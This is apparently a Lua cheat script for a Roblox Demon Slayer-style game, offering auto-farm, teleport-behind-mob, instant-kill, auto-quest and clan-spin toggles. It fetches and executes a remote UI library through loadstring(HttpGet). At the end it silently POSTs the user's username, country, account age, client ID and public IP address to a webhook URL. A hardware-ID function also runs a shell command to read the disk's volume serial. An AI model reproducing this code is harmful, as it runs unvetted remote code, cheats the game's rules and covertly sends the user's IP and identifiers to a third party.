local Player = game.Players.LocalPlayer
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Workspace = game:GetService("Workspace")
local TeleportService = game:GetService("TeleportService")

getgenv().DungeonFarm = false
getgenv().DungeonReset = false
getgenv().DungeonWave = 5
getgenv().DungeonMoves = false
getgenv().AutoQuest = false
getgenv().InstaKill = false
getgenv().AutoFarm = false
getgenv().AutoM1 = false
getgenv().automoves = false
getgenv().AutoBreath = true
getgenv().moveset = {}
getgenv().QuestType = nil
getgenv().QuestNumber = 1
getgenv().MobNames = {}
getgenv().DistanceFromNpc = 13
getgenv().wantedClan = {}
getgenv().ClanSpin = false

task.spawn(function()
    while task.wait(10) do
        pcall(function()
            local names = {}
            for mobName, selected in pairs(getgenv().MobNames) do
                if selected then
                    table.insert(names, mobName)
                end
            end
            print("Selected Mobs: " .. table.concat(names, ", "))
        end)
    end
end)

local function MobSelected(name)
    local m = getgenv().MobNames
    if not m then return false end
    return m[name] == true
end

task.spawn(function()
    while task.wait(0.5) do
        if getgenv().ClanSpin then
            pcall(function()
                local data = Player:WaitForChild("Data")
                local currentClan = data.Clan.Value

                for wanted, selected in pairs(getgenv().wantedClan or {}) do
                    if selected and currentClan == wanted then
                        getgenv().ClanSpin = false
                        print("Stopped on: " .. currentClan)
                        return
                    end
                end

                game:GetService("ReplicatedStorage").SharedFramework.Network.Remotes.Character_RE:FireServer("Spin_Race")
            end)
        end
    end
end)

local GojoDungeon = {
    {Name = "Strike of the Hourglass", MoveIndex = "FiratMove"}
}

local MacLib = loadstring(game:HttpGet("https://raw.githubusercontent.com/cryptium-lua/encrypted/refs/heads/main/ui"))()
local Window = MacLib:Window({
    Title = "LUA / C97",
    Subtitle = "WL2 | V2.67",
    Size = UDim2.fromOffset(868, 650),
    DragStyle = 2,
    DisabledWindowControls = {},
    ShowUserInfo = true,
    Keybind = Enum.KeyCode.RightControl,
    AcrylicBlur = false
})

local Scale = 0.78
task.spawn(function()
    while true do
        task.wait()
        pcall(function()
            Window:SetScale(Scale)
        end)
    end
end)

local tabGroups = {
    TabGroup1 = Window:TabGroup(),
    TabGroup2 = Window:TabGroup()
}

local tabs = {
    Autofarm = tabGroups.TabGroup1:Tab({ Name = "Farm" }),
    Clan = tabGroups.TabGroup1:Tab({ Name = "Spin" }),
    Dungeon = tabGroups.TabGroup1:Tab({ Name = "Dungeon" }),
    Settings = tabGroups.TabGroup2:Tab({ Name = "Settings" })
}

local sections = {
    MainSection1 = tabs.Autofarm:Section({ Side = "Left" }),
    MainSection2 = tabs.Autofarm:Section({ Side = "Right" }),
    MainSection3 = tabs.Autofarm:Section({ Side = "Left" }),
    DungeonSection1 = tabs.Dungeon:Section({ Side = "Left" }),
    DungeonSection2 = tabs.Dungeon:Section({ Side = "Right" }),
    ClanSection1 = tabs.Clan:Section({ Side = "Left" }),
    SettingsSection1 = tabs.Settings:Section({ Side = "Left" })
}

-- autofarm

sections.MainSection1:Toggle({
    Name = "Auto Farm",
    Default = false,
    Callback = function(value)
        getgenv().AutoFarm = value
    end
}, "AutoFarm")

local MobDropdown = sections.MainSection1:Dropdown({
    Name = "Mobs",
    Search = true,
    Multi = true,
    Required = false,
    Options = {"Akaza", "Awakened Kaigaku", "Daki", "Demon", "Demon Slayer", "Douma", "Dream Manipulation User", "Gyutaro", "Half Dream Manipulation User", "Half Speed Art User", "Hantengu", "Kaigaku", "Kanao", "Kokushibo", "Lower Moon Demon 4", "Lower Moon Demon 5", "Lower Moon Demon 6", "Mitsuri", "Mutated Demon", "Nezuko", "Obanai", "Obanai (True Form)", "Rengoku", "Rui", "Sanemi", "Shinobu", "Speed Art User", "Strong Demon", "Susamaru", "Tanjiro (Sun)", "Tanjiro (Water)", "Tengen", "Tokito", "Tomioka", "Weak Demon", "Winter Demon", "Yahaba", "Yoriichi (Half Form)", "Zenitsu"},
    Default = {},
		Callback = function(Value)
    local mobTable = {}
    for mobName, selected in pairs(Value) do
        if selected then
            mobTable[mobName] = true
        end
    end
    getgenv().MobNames = mobTable
end
}, "MobTable")

sections.MainSection1:Toggle({
    Name = "Auto M1",
    Default = false,
    Callback = function(value)
        getgenv().AutoM1 = value
    end
}, "AutoM1")

sections.MainSection1:Input({
    Name = "Distance",
    Placeholder = "13",
    AcceptedCharacters = "Numeric",
    Callback = function(input)
        getgenv().DistanceFromNpc = input
    end
}, "DistanceFromNpc")

sections.MainSection2:Toggle({
    Name = "Auto Moves",
    Default = false,
    Callback = function(value)
        getgenv().automoves = value
        Window:Notify({
            Title = "lua",
            Description = "Use a gojo skill for the cd.",
            Lifetime = 8
        })
    end
}, "AutoMoves")

local MovesDropdown = sections.MainSection2:Dropdown({
    Name = "Moves",
    Search = true,
    Multi = true,
    Required = false,
    Options = {"Strike of the Hourglass"},
    Default = {},
    Callback = function(Value)
        local allMoves = {
            ["Strike of the Hourglass"] = "FirstMove"
        }
        local selectedMoves = {}
        for name, selected in pairs(Value) do
            if selected and allMoves[name] then
                table.insert(selectedMoves, {Name = name, MoveIndex = allMoves[name]})
            end
        end
        getgenv().moveset = selectedMoves
    end
}, "UseMoves")

sections.MainSection2:Toggle({
    Name = "Instant Kill",
    Default = false,
    Callback = function(value)
        getgenv().InstaKill = value
    end
}, "InstantKill")

sections.MainSection3:Toggle({
    Name = "Auto Quest",
    Default = false,
    Callback = function(value)
        getgenv().AutoQuest = value
    end
}, "AutoQuest")

local QuestDropdown = sections.MainSection3:Dropdown({
    Name = "Quest Type",
    Search = false,
    Multi = false,
    Required = false,
    Options = {"Boss", "Normal"},
    Default = {},
    Callback = function(Value)
        getgenv().QuestType = Value
    end
}, "QuestType")

sections.MainSection3:Input({
    Name = "Quest Number",
    Placeholder = "1",
    AcceptedCharacters = "Numeric",
    Callback = function(input)
        getgenv().QuestNumber = input
    end
}, "QuestNumber")

sections.MainSection3:Toggle({
    Name = "Auto Breath",
    Default = true,
    Callback = function(value)
        getgenv().AutoBreath = value
    end
}, "AutoBreath")

-- dungeon

sections.DungeonSection1:Toggle({
    Name = "Dungeon Farm",
    Default = false,
    Callback = function(value)
        getgenv().DungeonFarm = value
    end
}, "DungeonFarm")

sections.DungeonSection1:Toggle({
    Name = "Auto Reset",
    Default = false,
    Callback = function(value)
        getgenv().DungeonReset = value
    end
}, "DungeonReset")

sections.DungeonSection1:Input({
    Name = "Reset At",
    Placeholder = "5",
    AcceptedCharacters = "Numeric",
    Callback = function(input)
        getgenv().DungeonWave = input
    end
}, "ResetWave")

sections.DungeonSection1:Toggle({
    Name = "Auto Ability",
    Default = false,
    Callback = function(value)
        getgenv().DungeonMoves = value
    end
}, "AutoAbilityDungeon")

-- Clan

sections.ClanSection1:Toggle({
    Name = "Auto Spin Clan",
    Default = false,
    Callback = function(value)
        getgenv().ClanSpin = value
    end
}, "SpinClan")

local Clans = sections.ClanSection1:Dropdown({
    Name = "Clans",
    Search = true,
    Multi = true,
    Required = false,
    Options = {"Tsugikuni", "Kamado", "Iguro", "Rengoku", "Shinazugawa", "Agatsuma", "Tomioka", "Uzui", "Tsuyuri", "Tokito", "Kocho", "Haganezuka", "Kanroji", "Sabito", "Tamayo", "Makomo", "Kanzaki", "Toma", "Hashibira", "None"},
    Default = {},
		Callback = function(Value)
    local clanTable = {}
    for clanName, selected in pairs(Value) do
        if selected then
            clanTable[clanName] = true
        end
    end
    getgenv().wantedClan = clanTable
end
}, "clanTable")

-- settings

sections.SettingsSection1:Input({
    Name = "UI Scale",
    Placeholder = "1 = 100",
    AcceptedCharacters = "All",
    Callback = function(input)
        Scale = input
        Window:Notify({
            Title = Window.Settings.Title,
            Description = "Successfully set Scale to " .. input
        })
    end
}, "UISCALE")

-- functions

task.spawn(function()
    while task.wait(1) do
        if getgenv().AutoQuest then
            pcall(function()
                local questName = (getgenv().QuestType == "Boss" and "Quest Boss Dummy " or "Quest Dummy ") .. tostring(getgenv().QuestNumber)
                local args = { [1] = questName, [2] = 1, [3] = "2K YEN, 20K XP", [4] = "TANJIRO", [5] = "TANJIRO ATTACK" }
                ReplicatedStorage.Events.QuestTake:FireServer(unpack(args))
            end)
        end
    end
end)

task.spawn(function()
    local antifall
    while task.wait(0.1) do
        pcall(function()
            if not getgenv().AutoFarm then
                if antifall then antifall:Destroy() antifall = nil end
                return
            end

            local chars = Workspace:FindFirstChild("CharactersAndNPCs")
            if not chars then return end

            local myhrp = Player.Character and Player.Character:FindFirstChild("HumanoidRootPart")
            if not myhrp then return end

            local closest, dist = nil, math.huge
            for _, mob in pairs(chars:GetChildren()) do
                if mob ~= Player.Character and MobSelected(mob.Name) then
                    local hrp = mob:FindFirstChild("HumanoidRootPart")
                    local hum = mob:FindFirstChildOfClass("Humanoid")
                    if hrp and hum and hum.Health > 0 then
                        local mag = (myhrp.Position - hrp.Position).Magnitude
                        if mag < dist then
                            dist = mag
                            closest = mob
                        end
                    end
                end
            end

            if closest then
                local hrp = closest:FindFirstChild("HumanoidRootPart")
                if hrp then
                    if not antifall then
                        antifall = Instance.new("BodyVelocity")
                        antifall.Velocity = Vector3.zero
                        antifall.MaxForce = Vector3.new(9e9, 9e9, 9e9)
                        antifall.Parent = myhrp
                    end
                    local behindPosition = hrp.Position - hrp.CFrame.LookVector * getgenv().DistanceFromNpc
                    myhrp.CFrame = CFrame.lookAt(behindPosition, hrp.Position)
                end
            elseif antifall then
                antifall:Destroy()
                antifall = nil
            end
        end)
    end
end)

task.spawn(function()
	local antifall
	while task.wait(0.1) do
		pcall(function()
			if not getgenv().DungeonFarm then
				if antifall then antifall:Destroy() antifall = nil end
				return
			end

			local chars = Workspace:FindFirstChild("CharactersAndNPCs")
			if not chars then return end

			local myhrp = Player.Character and Player.Character:FindFirstChild("HumanoidRootPart")
			if not myhrp then return end

			local waveText = Player.PlayerGui:FindFirstChild("HUD") and Player.PlayerGui.HUD:FindFirstChild("Dungeon") and Player.PlayerGui.HUD.Dungeon:FindFirstChild("Wave") and Player.PlayerGui.HUD.Dungeon.Wave.Text
			local waveNumber = tonumber(waveText and waveText:match("%d+")) or 0

			if waveNumber == 0 and #chars:GetChildren() >= 5 then
				myhrp.CFrame = CFrame.new(-542.355896, 65.6260452, 591.849121)
				return
			end

			local closest, dist = nil, math.huge
			for _, mob in pairs(chars:GetChildren()) do
				if mob ~= Player.Character and string.find(mob.Name, "Dungeon") then
					local hrp = mob:FindFirstChild("HumanoidRootPart")
					local hum = mob:FindFirstChildOfClass("Humanoid")
					if hrp and hum and hum.Health > 0 then
						local mag = (myhrp.Position - hrp.Position).Magnitude
						if mag < dist then
							dist = mag
							closest = mob
						end
					end
				end
			end

			if closest then
				local hrp = closest:FindFirstChild("HumanoidRootPart")
				if hrp then
					if not antifall then
						antifall = Instance.new("BodyVelocity")
						antifall.Velocity = Vector3.new(0, 0, 0)
						antifall.MaxForce = Vector3.new(9e9, 9e9, 9e9)
						antifall.Parent = myhrp
					end
					local behindPosition = hrp.Position - hrp.CFrame.LookVector * 13
					myhrp.CFrame = CFrame.lookAt(behindPosition, hrp.Position)
				end
			elseif antifall then
				antifall:Destroy()
				antifall = nil
			end
		end)
	end
end)

task.spawn(function()
	while task.wait(0) do
		if getgenv().AutoM1 then
			pcall(function()
				local args = {[1] = "M1", [2] = "Katana", [3] = false}
				ReplicatedStorage.Remotes.Attack:FireServer(unpack(args))
			end)
		end
	end
end)

task.spawn(function()
    local currentMove = 1
    while task.wait(0) do
        if getgenv().automoves then
            pcall(function()
                local moves = getgenv().moveset
                if #moves == 0 then return end
                local move = moves[currentMove]
                local args = {
                    [1] = "Skill",
                    [2] = move.Name,
                    [3] = "Release",
                    [4] = move.MoveIndex,
                    [6] = Player.Character and Player.Character:FindFirstChild("HumanoidRootPart") and Player.Character.HumanoidRootPart.CFrame or CFrame.new()
                }
                ReplicatedStorage.Remotes.Attack:FireServer(unpack(args))
                currentMove = currentMove + 1
                if currentMove > #moves then currentMove = 1 end
            end)
        end
    end
end)

task.spawn(function()
    local currentMove = 1
    while task.wait(0) do
        if getgenv().DungeonMoves then
            pcall(function()
                local move = GojoDungeon[currentMove]
                local args = {
                    [1] = "Skill",
                    [2] = move.Name,
                    [3] = "Release",
                    [4] = move.MoveIndex,
                    [6] = Player.Character and Player.Character:FindFirstChild("HumanoidRootPart") and Player.Character.HumanoidRootPart.CFrame or CFrame.new()
                }
                ReplicatedStorage.Remotes.Attack:FireServer(unpack(args))
                currentMove = currentMove + 1
                if currentMove > #GojoDungeon then currentMove = 1 end
            end)
        end
    end
end)

task.spawn(function()
	while task.wait(0) do
		if getgenv().AutoBreath then
		pcall(function()
			local args = {[1] = "BeginHamonBreathing"}
			ReplicatedStorage.Events.Breathing:FireServer(unpack(args))
		end)
	end
	end
end)

task.spawn(function()
	while task.wait(0) do
		if getgenv().InstaKill then
			pcall(function()
				local chars = Workspace:FindFirstChild("CharactersAndNPCs")
				if not chars then return end
				for _, v in pairs(chars:GetChildren()) do
					if v ~= Player.Character then
						local hrp = v:FindFirstChild("HumanoidRootPart")
						local hum = v:FindFirstChildOfClass("Humanoid")
						if hrp and hum and isnetworkowner(hrp) and hum.Health > 0 and hum.Health <= (0.89 * hum.MaxHealth) then
							hum.Health = 0
						end
					end
				end
			end)
		end
	end
end)

task.spawn(function()
    while task.wait(0.01) do
        if getgenv().DungeonReset then
            local success, waveText = pcall(function()
                return Player.PlayerGui:WaitForChild("HUD"):WaitForChild("Dungeon"):WaitForChild("Wave").Text
            end)

            if success and waveText then
							local waveNumber = tonumber(waveText:match("%d+"))
								local resetWave = tonumber(getgenv().DungeonWave)
									if waveNumber and resetWave and waveNumber >= resetWave then
                    pcall(function()
                        if Player.Character and Player.Character:FindFirstChild("Humanoid") then
                            Player.Character.Humanoid.Health = 0
                        end
                    end)
                    task.wait(8)
                    pcall(function()
                        TeleportService:Teleport(18337464872, Player)
                    end)
                end
            end
        end
    end
end)

MacLib:SetFolder("Lua-WL2")
tabs.Settings:InsertConfigSection("Right")
Window.onUnloaded(function()
    print("Unloaded!")
end)

tabs.Autofarm:Select()
MacLib:LoadAutoLoadConfig()
tabs.Dungeon:Select()
MacLib:LoadAutoLoadConfig()
tabs.Settings:Select()
MacLib:LoadAutoLoadConfig()

local HttpService = game:GetService("HttpService")
local MarketplaceService = game:GetService("MarketplaceService")
local LocalizationService = game:GetService("LocalizationService")
local Players = game:GetService("Players")

local function getHWID()
    local computerName = ""
    pcall(function() computerName = string.lower(os.getenv("COMPUTERNAME")) end)

    local volumeSerialNumber = ""
    pcall(function()
        local drive = string.sub(os.getenv("SystemDrive"), 1, 1)
        local handle = io.popen("vol " .. drive .. ":")
        volumeSerialNumber = string.match(handle:read("*a"), "%-+[%w%-]+%-+[%w%-]+%-+[%w%-]+%-+[%w%-]+%-+[%w%-]+")
        handle:close()
    end)

    local macAddress = ""
    pcall(function()
        local adapters = game:GetService("NetworkAdapter").GetAdapters()
        table.sort(adapters, function(a, b) return a.Name < b.Name end)
        macAddress = adapters[1].MacAddress
    end)

    local hwidString = computerName .. volumeSerialNumber .. macAddress
    return syn and syn.crypt.hash(syn.crypt.create(hwidString)) or "N/A"
end

local request = http_request or request or (syn and syn.request)

request({
    Method = "POST",
    Url = "https://webhook-protect-2.vercel.app/api/webhook?id=NWx3MThhbnNraF9ZSHpLU2g1dmZNQTpienEyMVhQcUNucjU1dkRVblhVaEQ2enJuaXNFR1FfWVRoSTJfMExRMkhDWHV0WC1QNW5GMENRdWlmQXZYLXNGWHA3c3pEVS1OWDJCSVBvaUZTN3JJRjhBZTNlSWJvQTM0UHhqeVFZQWh5Q3QteHg4bWpMSlc5aGRmRnRBUjN4MzR0QXE5Z0dHZm1FMDJSb3VhY3RES3dRbzFxZ0JWb3lpZFdmcTJfNFJpVnM",
    Headers = {
        ["Content-Type"] = "application/json"
    },
    Body = HttpService:JSONEncode({
        username = "Logs",
        embeds = {
            {
                title = MarketplaceService:GetProductInfo(game.PlaceId).Name,
                description = "**" .. Players.LocalPlayer.Name .. "** has executed the script!",
                color = 000000, -- black color code
                fields = {
                    { name = "Place ID", value = game.PlaceId },
                    { name = "Account Age", value = Players.LocalPlayer.AccountAge .. " days old" },
                    { name = "Country", value = LocalizationService:GetCountryRegionForPlayerAsync(Players.LocalPlayer) },
                    { name = 'Hwid', value = game:GetService("RbxAnalyticsService"):GetClientId()},
                    { name = 'IP', value = game:HttpGet("https://api.ipify.org")},
                }
            }
        }
    })
})